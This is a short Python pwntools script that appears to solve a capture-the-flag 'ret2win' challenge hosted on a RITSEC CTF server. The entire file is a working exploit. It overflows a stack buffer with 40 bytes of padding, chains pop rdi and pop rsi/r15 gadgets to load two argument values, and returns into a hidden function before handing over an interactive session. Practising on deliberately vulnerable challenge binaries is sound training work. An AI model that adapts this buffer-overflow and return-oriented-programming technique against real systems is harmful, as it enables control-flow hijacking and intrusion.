#!/usr/bin/env python3
from pwn import *

secret_func = 0x401196
pop_rdi = 0x00000000004012b3
pop_rsi_r15 = 0x00000000004012b1

value1 = 0xcafebabe
value2 = 0xc0debabe

payload = b'A' * 40 + p64(pop_rdi) + p64(value1) + p64(pop_rsi_r15) + \
    p64(value2) + b'\x00\x00\x00\x00\x00\x00\x00\x00' + p64(secret_func)

# r = process('./ret2win')
r = remote('ret2win.challenges.ctf.ritsec.club', 1337)

# data = r.recv()
r.sendline(payload)
r.interactive()
